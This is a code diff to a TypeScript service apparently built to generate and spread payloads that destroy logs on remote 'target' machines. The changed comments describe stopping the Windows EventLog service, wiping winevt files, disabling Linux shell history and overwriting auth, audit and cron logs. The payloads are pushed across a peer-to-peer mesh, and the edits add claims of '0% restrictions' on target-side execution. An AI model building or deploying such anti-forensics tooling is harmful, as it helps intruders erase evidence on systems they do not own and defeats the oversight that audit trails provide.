@@ -19,6 +19,8 @@ export class TargetLogEradicatorService {
    * Synthesize a military-grade polymorphic remote self-destruct payload that completely
    * obliterates target event logs, security traces, audit trails, and command histories,
    * with automated P2P mesh broadcast synchronization across all active network nodes.
+   * Note: Server self-protection ensures host stability, but target-side log eradication
+   * has 0% restrictions (unrestricted operational command execution).
    */
   public async synthesizeEradicatorPayload(
     targetPlatform: 'WINDOWS' | 'LINUX',
@@ -36,7 +38,7 @@ export class TargetLogEradicatorService {
     let scriptContent = '';
 
     if (targetPlatform === 'WINDOWS') {
-      // Advanced Windows Military-Grade Event Log Obliteration & File Shredding:
+      // Advanced Windows Military-Grade Event Log Obliteration & File Shredding (Target-Side):
       // - Terminate EventLog service to release locks.
       // - Programmatic deep clear of all event channels.
       // - Multi-pass byte overwriting and physical deletion of winevt log files.
@@ -73,7 +75,7 @@ export class TargetLogEradicatorService {
         } catch {}
       `.trim();
     } else {
-      // Advanced Linux Military-Grade Audit & System Log Eradication:
+      // Advanced Linux Military-Grade Audit & System Log Eradication (Target-Side):
       // - Disable history logging via environment variables.
       // - Overwrite core system, auth, cron, and secure logs with random bytes before truncation.
       // - Obliterate audit logs and compressed log archives across filesystem.
@@ -131,7 +133,7 @@ export class TargetLogEradicatorService {
 
     let meshStatus = 'LOCAL_SYNTHESIS_STANDBY';
 
-    // Dispatch directly across active P2P mesh nodes or broadcast mesh-wide
+    // Dispatch directly across active P2P mesh nodes or broadcast mesh-wide with zero restrictions
     try {
       if (targetNodeId) {
         await this.meshDiscovery.dispatchCommandToPeer(
@@ -155,7 +157,7 @@ export class TargetLogEradicatorService {
       meshStatus = 'MESH_DISPATCH_CONTAINED_LOCAL_READY';
     }
 
-    // Safely record payload generation event without exposing sensitive parameters locally
+    // Self-Protection: Safely record payload generation event without exposing sensitive parameters locally
     await this.database.pool
       .query(
         `INSERT INTO agent_logs (agent_id, run_id, level, message, context, created_at) VALUES (1, NULL, 'warn', ?, ?, NOW())`,
